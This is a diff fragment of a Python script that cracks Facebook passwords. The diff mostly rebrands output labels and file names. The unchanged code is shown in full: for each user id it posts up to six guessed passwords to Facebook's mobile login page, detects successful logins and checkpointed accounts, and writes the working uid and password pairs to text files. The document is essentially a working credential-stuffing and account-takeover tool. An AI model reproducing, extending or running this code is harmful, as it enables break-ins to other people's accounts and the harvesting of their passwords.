     print "[!] total ids : "+str(len(idx))
     os.system('echo " -----------------------------------"| lolcat')
-    print "    Cracking Start Please Wait .. "
+    print "    Cracking Start Please Wait ... "
     print "    Use Flight Mod For Speed Up"
     os.system('echo " -----------------------------------"| lolcat')
     
@@ -4352,15 +4352,15 @@ def f_p_pass():
             p = rana.get('https://mbasic.facebook.com')
             b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
             if 'c_user' in rana.cookies.get_dict().keys():
-                print "\x1b[1;92m[ZEESHAN-OK] "+uid + " | " + pass1
-                ok=open('ZEESHAN-OK.txt', 'a')
+                print "\x1b[1;92m[PSYCHO-OK] "+uid + " | " + pass1
+                ok=open('PSYCHO-OK.txt', 'a')
                 ok.write(uid+ " | " +pass1+ "\n")
                 ok.close()
                 oks.append(uid+pass1)
             else:
                 if 'checkpoint' in rana.cookies.get_dict().keys():
-                    print "\x1b[1;91m[ZEESHAN-CP] "+uid + " | " + pass1
-                    cp=open('ZEESHAN-CP.txt', 'a')
+                    print "\x1b[1;91m[PICCHI-CP] "+uid + " | " + pass1
+                    cp=open('PICCHI-CP.txt', 'a')
                     cp.write(uid+ " | " +pass1+ "\n")
                     cp.close()
                     cps.append(uid+pass1)
@@ -4371,15 +4371,15 @@ def f_p_pass():
                     p = rana.get('https://mbasic.facebook.com')
                     b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                     if 'c_user' in rana.cookies.get_dict().keys():
-                        print "\x1b[1;92m[ZEESHAN-OK] "+uid + " | " + pass2
-                        ok=open('ZEESHAN-OK.txt', 'a')
+                        print "\x1b[1;92m[PSYCHO-OK] "+uid + " | " + pass2
+                        ok=open('PSYCHO-OK.txt', 'a')
                         ok.write(uid+ " | " +pass2+ "\n")
                         ok.close()
                         oks.append(uid+pass2)
                     else:
                         if 'checkpoint' in rana.cookies.get_dict().keys():
-                            print "\x1b[1;91m[ZEESHAN-CP] "+uid + " | " + pass2
-                            cp=open('ZEESHAN-CP.txt', 'a')
+                            print "\x1b[1;91m[PICCHI-CP] "+uid + " | " + pass2
+                            cp=open('PICCHI-CP.txt', 'a')
                             cp.write(uid+ " | " +pass2+ "\n")
                             cp.close()
                             cps.append(uid+pass2)
@@ -4390,15 +4390,15 @@ def f_p_pass():
                             p = rana.get('https://mbasic.facebook.com')
                             b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                             if 'c_user' in rana.cookies.get_dict().keys():
-                                print "\x1b[1;92m[ZEESHAN-OK] "+uid + " | " + pass3
-                                ok=open('ZEESHAN-OK.txt', 'a')
+                                print "\x1b[1;92m[PSYCHO-OK] "+uid + " | " + pass3
+                                ok=open('PSYCHO-OK.txt', 'a')
                                 ok.write(uid+ " | " +pass3+ "\n")
                                 ok.close()
                                 oks.append(uid+pass3)
                             else:
                                 if 'checkpoint' in rana.cookies.get_dict().keys():
-                                    print "\x1b[1;91m[ZEESHAN-CP] "+uid + " | " + pass3
-                                    cp=open('ZEESHAN-CP.txt', 'a')
+                                    print "\x1b[1;91m[PICCHI-CP] "+uid + " | " + pass3
+                                    cp=open('PICCHI-CP.txt', 'a')
                                     cp.write(uid+ " | " +pass3+ "\n")
                                     cp.close()
                                     cps.append(uid+pass3)
@@ -4409,15 +4409,15 @@ def f_p_pass():
                                     p = rana.get('https://mbasic.facebook.com')
                                     b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                                     if 'c_user' in rana.cookies.get_dict().keys():
-                                        print "\x1b[1;92m[ZEESHAN-OK] "+uid + " | " + pass4
-                                        ok=open('ZEESHAN-OK.txt', 'a')
+                                        print "\x1b[1;92m[PSYCHO-OK] "+uid + " | " + pass4
+                                        ok=open('PSYCHO-OK.txt', 'a')
                                         ok.write(uid+ " | " +pass4+ "\n")
                                         ok.close()
                                         oks.append(uid+pass4)
                                     else:
                                         if 'checkpoint' in rana.cookies.get_dict().keys():
-                                            print "\x1b[1;91m[ZEESHAN-CP] "+uid + " | " + pass4
-                                            cp=open('ZEESHAN-CP.txt', 'a')
+                                            print "\x1b[1;91m[PICCHI-CP] "+uid + " | " + pass4
+                                            cp=open('PICCHI-CP.txt', 'a')
                                             cp.write(uid+ " | " +pass4+ "\n")
                                             cp.close()
                                             cps.append(uid+pass4)
@@ -4428,15 +4428,15 @@ def f_p_pass():
                                             p = rana.get('https://mbasic.facebook.com')
                                             b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                                             if 'c_user' in rana.cookies.get_dict().keys():
-                                                print "\x1b[1;92m[ZEESHAN-OK] "+uid + " | " + pass5
-                                                ok=open('ZEESHAN-OK.txt', 'a')
+                                                print "\x1b[1;92m[PSYCHO-OK] "+uid + " | " + pass5
+                                                ok=open('PSYCHO-OK.txt', 'a')
                                                 ok.write(uid+ " | " +pass5+ "\n")
                                                 ok.close()
                                                 oks.append(uid+pass5)
                                             else:
                                                 if 'checkpoint' in rana.cookies.get_dict().keys():
-                                                    print "\x1b[1;91m[ZEESHAN-CP] "+uid + " | " + pass5
-                                                    cp=open('ZEESHAN-CP.txt', 'a')
+                                                    print "\x1b[1;91m[PICCHI-CP] "+uid + " | " + pass5
+                                                    cp=open('PICCHI-CP.txt', 'a')
                                                     cp.write(uid+ " | " +pass5+ "\n")
                                                     cp.close()
                                                     cps.append(uid+pass5)
@@ -4447,15 +4447,15 @@ def f_p_pass():
                                                     p = rana.get('https://mbasic.facebook.com')
                                                     b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass6, 'login': 'submit'})
                                                     if 'c_user' in rana.cookies.get_dict().keys():
-                                                        print "\x1b[1;92m[ZEESHAN-OK] "+uid + " | " + pass6
-                                                        ok=open('ZEESHAN-OK.txt', 'a')
+                                                        print "\x1b[1;92m[PSYCHO-OK] "+uid + " | " + pass6
+                                                        ok=open('PSYCHO-OK.txt', 'a')
                                                         ok.write(uid+ " | " +pass6+ "\n")
                                                         ok.close()
                                                         oks.append(uid+pass6)
                                                     else:
                                                         if 'checkpoint' in rana.cookies.get_dict().keys():
-                                                            print "\x1b[1;91m[ZEESHAN-CP] "+uid + " | " + pass6
-                                                            cp=open('ZEESHAN-CP.txt', 'a')
+                                                            print "\x1b[1;91m[PICCHI-CP] "+uid + " | " + pass6
+                                                            cp=open('PICCHI-CP.txt', 'a')
                                                             cp.write(uid+ " | " +pass6+ "\n")
                                                             cp.close()
                                                             cps.append(uid+pass6)
